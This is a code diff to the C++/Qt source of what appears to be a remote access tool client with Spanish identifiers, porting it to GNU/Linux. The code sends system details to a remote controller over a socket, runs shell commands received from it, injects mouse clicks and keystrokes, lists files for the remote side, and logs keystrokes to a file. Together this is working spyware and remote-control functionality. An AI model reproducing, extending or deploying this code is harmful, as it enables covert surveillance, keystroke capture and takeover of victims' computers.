@@ -352,10 +352,14 @@ void MainWindow::llegadaDatos() {
             default:
                 break;
             }
-
-            util.escribirSocket("informacion|@|" + so + "|@|" + version + "|@|" + homePath + "|@|" + tempPath + "|@|" + ancho + "|@|" + alto + "|@|" + fecha + "|@|" + hora + "|@|" + alias + "|@|",&socket);
+        #else
+            so = "GNU/Linux";
+            QProcess ver;
+            ver.start("uname -a");
+            ver.waitForReadyRead();
+            version =  ver.readAll();
         #endif
-
+            util.escribirSocket("informacion|@|" + so + "|@|" + version + "|@|" + homePath + "|@|" + tempPath + "|@|" + ancho + "|@|" + alto + "|@|" + fecha + "|@|" + hora + "|@|" + alias + "|@|",&socket);
     }
 
 }
@@ -370,7 +374,9 @@ void MainWindow::llegadaDatosEscritorio(){
     QStringList parametros = datos.split("|@|");
     if(parametros[0] == "tecla")
     {
+        #ifdef Q_WS_WIN
         enviarTecla(parametros[1].toInt());
+        #endif
     }
     if (parametros[0] == "derecho")
     {
@@ -378,7 +384,9 @@ void MainWindow::llegadaDatosEscritorio(){
         puntero.setX(parametros[1].toInt());
         puntero.setY(parametros[2].toInt());
         QTest::mouseMove(QApplication::desktop(),puntero);
+        #ifdef Q_WS_WIN
         hacerClickDerecho();
+        #endif
     }
     if (parametros[0] == "izquierdo")
     {
@@ -386,7 +394,9 @@ void MainWindow::llegadaDatosEscritorio(){
         puntero.setX(parametros[1].toInt());
         puntero.setY(parametros[2].toInt());
         QTest::mouseMove(QApplication::desktop(),puntero);
+        #ifdef Q_WS_WIN
         hacerClickIzquierdo();
+        #endif
     }
     if (parametros[0] == "resolucion")
     {
@@ -452,7 +462,11 @@ void MainWindow::desconectado() {
 
 QString MainWindow::shell(QString comando){
     /** Función que ejecuta el comando de consola pasado como parámetro y devuelve la salida **/
-    consola.start("cmd.exe /C " + comando);
+    #ifdef Q_WS_WIN
+        consola.start("cmd.exe /C " + comando);
+    #else
+        consola.start(comando);
+    #endif
     consola.waitForReadyRead();
     return consola.readAllStandardOutput();
 }
@@ -482,6 +496,7 @@ void MainWindow::listarArchivos(QString ruta){
         archivos = archivos + listaArchivos[i] + "|@|";
     }
     util.escribirSocket(archivos,&socket);
+    socket.waitForBytesWritten();
 }
 
 void MainWindow::listarDirectorios(QString ruta){
@@ -493,8 +508,8 @@ void MainWindow::listarDirectorios(QString ruta){
     for (i=0;i<listaDirectorios.size();i++){
         directorios = directorios + listaDirectorios[i] + "|@|";
     }
-
     util.escribirSocket(directorios,&socket);
+    socket.waitForBytesWritten();
 }
 
 void MainWindow::mostrarMensaje(QString tipo, QString titulo, QString texto){
@@ -559,7 +574,9 @@ void MainWindow::escucharTeclas()
 {
         log.open(QFile::Append);
         char num;
+        #ifdef Q_WS_WIN
         num = comprobarTeclas();
+        #endif
         if(num != 0)
         {
             cadenaa.append(num);
